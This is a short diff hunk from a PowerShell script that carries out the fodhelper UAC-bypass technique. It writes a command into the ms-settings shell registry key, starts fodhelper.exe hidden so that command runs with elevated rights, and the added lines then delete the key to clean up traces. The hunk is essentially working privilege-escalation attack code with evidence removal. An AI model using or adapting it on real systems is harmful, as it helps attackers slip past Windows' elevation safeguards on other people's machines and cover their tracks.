@@ -11,3 +11,6 @@ Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -
 #Starts the fodhelper process to execute your command.
 
 Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
+
+#Cleaning up the mess created.
+Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
